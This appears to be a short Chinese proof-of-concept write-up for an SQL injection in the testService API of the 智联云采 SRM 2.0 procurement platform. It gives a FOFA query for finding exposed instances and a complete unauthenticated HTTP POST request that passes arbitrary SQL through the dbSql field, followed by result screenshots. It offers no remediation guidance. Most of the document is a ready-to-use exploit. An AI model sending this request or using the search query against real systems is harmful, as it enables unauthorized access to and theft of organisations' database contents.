# 智联云采testService存在SQL注入漏洞

智联云采testService存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息。

## fofa

```yaml
title=="SRM 2.0"
```

## poc

```java
POST /adpweb/a/ica/api/testService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Requested-With: XMLHttpRequest
Content-Type: application/json

{
    "dbId": "1001",
    "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
    "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
    "serviceCode": "q",
    "serviceName": "q",
    "serviceParams": "{\"lang\":\"zh_CN\"}"
}
```

![image-20241018154644283](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181546560.png)

![image-20241018154704052](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181547135.png)